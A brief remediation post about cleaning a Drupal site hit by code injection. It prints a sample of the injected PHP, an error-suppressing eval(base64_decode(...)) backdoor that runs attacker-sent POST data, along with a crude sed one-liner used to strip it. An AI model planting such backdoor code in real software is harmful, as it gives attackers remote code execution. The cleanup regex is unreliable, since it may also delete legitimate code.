# Remove Drupal Code injection

Had a client whose site got hit with a big code injection attack. There were many hundreds of compromised files and no clean copy of the code anywhere.

The injected code looked something like this:

```<?php /*457563643*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval(base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19w')); /*457563643*/ ?>```


With too many files to clean up manually, we removed the offending code with

```find . -name "*.php" | xargs sed -i 's/<*.*[[:digit:]]+*.*eval*.*[[:digit:]]+*.*>//g' *.php```

,replaced the core files with the latest Drupal version and put the clean into version control.

Your mileage may vary. 
